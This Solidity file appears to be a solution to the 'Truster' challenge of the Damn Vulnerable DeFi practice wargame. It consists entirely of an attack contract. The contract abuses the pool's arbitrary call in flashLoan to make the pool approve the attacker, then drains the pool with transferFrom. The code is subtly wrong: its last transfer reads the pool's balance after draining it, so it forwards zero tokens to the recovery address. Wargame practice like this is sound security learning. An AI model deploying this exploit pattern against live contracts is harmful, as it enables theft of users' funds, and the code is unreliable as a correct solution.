// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
contract AttackTruster {

    DamnValuableToken public token;
    TrusterLenderPool public pool;
    address public recovery;

    constructor(address _token, address _pool, address _recovery) {
        token = DamnValuableToken(_token);
        pool = TrusterLenderPool(_pool);
        recovery = _recovery;
    }

    function attack() external returns(bool){
        require(
            pool.flashLoan(
                0,
                address(this),
                address(token),
                abi.encodeWithSignature("approve(address,uint256)", address(this), token.balanceOf(address(pool)))
            )
        );

        require(token.transferFrom(address(pool), address(this), token.balanceOf(address(pool))));
        require(token.transfer(recovery, token.balanceOf(address(pool))));

        return true;
    }
}